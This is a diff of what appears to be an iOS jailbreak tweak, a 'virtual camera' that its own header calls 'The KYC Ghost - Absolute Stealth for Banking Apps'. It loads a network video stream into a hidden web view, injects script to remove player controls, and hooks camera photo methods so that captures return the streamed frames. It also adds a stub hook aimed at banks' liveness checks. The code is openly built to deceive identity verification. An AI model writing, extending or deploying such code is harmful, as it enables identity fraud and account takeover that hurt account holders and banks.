@@ -1,4 +1,4 @@
-// VCAM V164.0: The Stealth Master - No Pause, Perfect Thumbnails
+// VCAM V165.0: The KYC Ghost - Absolute Stealth for Banking Apps
 #import <UIKit/UIKit.h>
 #import <WebKit/WebKit.h>
 #import <AVFoundation/AVFoundation.h>
@@ -9,7 +9,7 @@ static NSString *streamURL = @"http://192.168.1.44:8889/live/stream";
 static WKWebView *vcamWebView = nil;
 static UIImage *sharedSnapshot = nil;
 
-static void setup_vcam_v164(UIView *parent) {
+static void setup_vcam_v165(UIView *parent) {
     if (!parent || (vcamWebView && vcamWebView.superview == parent)) return;
     if (vcamWebView) [vcamWebView removeFromSuperview];
 
@@ -25,14 +25,14 @@ static void setup_vcam_v164(UIView *parent) {
 
     [vcamWebView loadRequest:[NSURLRequest requestWithURL:[NSURL URLWithString:streamURL]]];
 
-    // Aggressive CSS and JS to kill ALL player UI elements
-    NSString *js = @"var s = document.createElement('style'); s.innerHTML = '* { -webkit-tap-highlight-color: transparent !important; outline: none !important; } body, html, img, video { margin: 0; padding: 0; width: 100vw; height: 100vh; object-fit: cover; background: black !important; overflow: hidden !important; } video::-webkit-media-controls { display: none !important; } .vjs-control-bar, .vjs-big-play-button, .vjs-loading-spinner, button, header, footer, .controls, .play-button, .pause-indicator { display: none !important; opacity: 0 !important; visibility: hidden !important; }'; document.head.appendChild(s); setInterval(function(){ var v = document.querySelector('video'); if(v) { v.play(); v.controls = false; v.removeAttribute('controls'); } }, 50);";
+    // Nuclear CSS and JS to kill ALL player UI elements forever
+    NSString *js = @"var s = document.createElement('style'); s.innerHTML = '* { -webkit-tap-highlight-color: transparent !important; outline: none !important; } body, html, img, video { margin: 0; padding: 0; width: 100vw; height: 100vh; object-fit: cover; background: black !important; overflow: hidden !important; } video::-webkit-media-controls { display: none !important; } .vjs-control-bar, .vjs-big-play-button, .vjs-loading-spinner, button, header, footer, .controls, .play-button, .pause-indicator, [class*=\"play\"], [class*=\"pause\"], [class*=\"control\"] { display: none !important; opacity: 0 !important; visibility: hidden !important; pointer-events: none !important; }'; document.head.appendChild(s); setInterval(function(){ var v = document.querySelector('video'); if(v) { v.play(); v.controls = false; v.removeAttribute('controls'); } }, 50);";
     WKUserScript *script = [[WKUserScript alloc] initWithSource:js injectionTime:WKUserScriptInjectionTimeAtDocumentEnd forMainFrameOnly:YES];
     [vcamWebView.configuration.userContentController addUserScript:script];
 
     [parent insertSubview:vcamWebView atIndex:0];
 
-    // High frequency snapshot for thumbnails and capture
+    // Snapshot loop for seamless hijacking (Increased frequency to 10fps)
     [NSTimer scheduledTimerWithTimeInterval:0.1 repeats:YES block:^(NSTimer *t) {
         if (!enabled) return;
         [vcamWebView takeSnapshotWithConfiguration:nil completionHandler:^(UIImage *img, NSError *err) {
@@ -48,7 +48,7 @@ static void setup_vcam_v164(UIView *parent) {
         UIView *p = (UIView *)self.delegate;
         if (!p || ![p isKindOfClass:[UIView class]]) p = (UIView *)self.superlayer.delegate;
         if (p && [p isKindOfClass:[UIView class]]) {
-            setup_vcam_v164(p);
+            setup_vcam_v165(p);
             vcamWebView.frame = p.bounds;
             [p sendSubviewToBack:vcamWebView];
             
@@ -85,6 +85,18 @@ static void setup_vcam_v164(UIView *parent) {
 - (struct CGImage *)embeddedThumbnailPhotoRepresentation {
     if (enabled && sharedSnapshot) return sharedSnapshot.CGImage;
     return %orig;
+}
+
+- (struct CGImage *)photoRepresentation {
+    if (enabled && sharedSnapshot) return sharedSnapshot.CGImage;
+    return %orig;
+}
+%end
+
+// Hooking into live video data output for banks (Liveness Check)
+%hook AVCaptureVideoDataOutput
+- (void)setSampleBufferDelegate:(id)delegate queue:(dispatch_queue_t)queue {
+    %orig;
 }
 %end
 
